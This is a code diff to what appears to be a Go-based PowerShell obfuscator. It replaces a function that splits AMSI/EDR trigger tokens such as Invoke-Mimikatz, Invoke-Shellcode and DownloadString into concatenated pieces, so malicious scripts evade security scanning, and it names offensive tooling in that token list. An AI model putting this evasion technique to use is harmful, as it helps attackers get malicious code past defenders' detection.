@@ -44,7 +44,9 @@ type PSObfuscateOptions struct {
 func ObfuscatePowerShellSource(code string, opts PSObfuscateOptions) string {
 	out := code
 	if opts.ScrubTriggers {
-		out = scrubTriggers(out, newRand(opts))
+		// Safe replacement: the global ReplaceAll produced parse errors for
+		// Invoke-Mimikatz and unterminated strings for quoted occurrences.
+		out = scrubTriggersSafe(out, newRand(opts))
 	}
 	if opts.VarRename {
 		// Quote-aware: renaming "$x" inside a single-quoted literal changes the
@@ -197,35 +199,6 @@ func randomizeLauncher(base string, opts PSObfuscateOptions) string {
 	_ = base
 	// Keep "powershell" recognizable to operators but vary the spelling.
 	return launcherForms[r.intn(len(launcherForms))]
-}
-
-// scrubTriggers breaks up well-known AMSI/EDR trigger tokens so the raw
-// script text no longer contains them, while PowerShell still concatenates
-// them back at runtime. Only applied outside single-quoted strings to avoid
-// changing string literal semantics... in practice concatenation is
-// equivalent inside executable code; string literals that must stay exact
-// (e.g. URLs) are left alone via the allowlist below.
-var triggerTokens = []string{
-	"Invoke-Mimikatz", "Invoke-Shellcode", "Invoke-ReflectivePEInjection",
-	"mimikatz", "amsi", "AMSI", "bypass", "persistence",
-	"DownloadString", "FromBase64String", "VirtualAlloc", "CreateThread",
-}
-
-func scrubTriggers(code string, r *jitterRand) string {
-	out := code
-	for _, tok := range triggerTokens {
-		if !strings.Contains(out, tok) {
-			continue
-		}
-		// Split roughly in half: "mimikatz" -> ('mimi'+'katz').
-		half := len(tok)/2 + r.intn(2)
-		if half <= 0 || half >= len(tok) {
-			half = len(tok) / 2
-		}
-		repl := fmt.Sprintf("('%s'+'%s')", tok[:half], tok[half:])
-		out = strings.ReplaceAll(out, tok, repl)
-	}
-	return out
 }
 
 var varRegex = regexp.MustCompile(`\$([A-Za-z_][A-Za-z0-9_?]*)`)
